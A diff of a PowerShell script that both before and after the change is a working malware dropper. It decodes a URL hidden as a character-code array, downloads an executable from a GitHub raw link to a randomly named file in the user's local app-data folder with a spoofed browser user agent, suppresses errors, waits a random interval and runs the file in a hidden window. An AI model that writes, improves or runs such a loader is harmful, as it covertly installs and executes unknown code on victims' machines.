@@ -1,28 +1,15 @@
 $u = -join ([char[]](104,116,116,112,115,58,47,47,103,105,116,104,117,98,46,99,111,109,47,109,97,116,118,101,106,115,107,108,97,114,111,118,57,45,99,121,98,101,114,47,109,121,47,114,97,119,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,115,101,114,118,105,99,101,46,101,120,101))
-$n = -join ((48..57 + 97..122) | Get-Random -Count 9 | ForEach-Object {[char]$_})
-$p = Join-Path $env:LOCALAPPDATA ($n + '.exe')
-
-$r = [Net.HttpWebRequest]::Create($u)
-$r.UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36'
-$r.Timeout = 20000
+$n = -join ((48..57+97..122)|Get-Random -Count 10|%{[char]$_})
+$p = "$env:LOCALAPPDATA\$n.exe"
 
 try {
-    $resp = $r.GetResponse()
-    $stream = $resp.GetResponseStream()
-    $fs = [IO.File]::Create($p)
-    $stream.CopyTo($fs)
-    $fs.Close()
-    $stream.Close()
-    $resp.Close()
+    $wc = New-Object Net.WebClient
+    $wc.Headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
+    $wc.DownloadFile($u, $p)
 } catch {}
 
-Start-Sleep -Milliseconds (Get-Random -Minimum 600 -Maximum 1600)
+Start-Sleep -m (Get-Random -Min 400 -Max 1200)
 
 if (Test-Path $p) {
-    $si = New-Object Diagnostics.ProcessStartInfo
-    $si.FileName = $p
-    $si.WindowStyle = 'Hidden'
-    $si.CreateNoWindow = $true
-    $si.UseShellExecute = $false
-    [Diagnostics.Process]::Start($si) | Out-Null
+    Start-Process $p -WindowStyle Hidden
 }
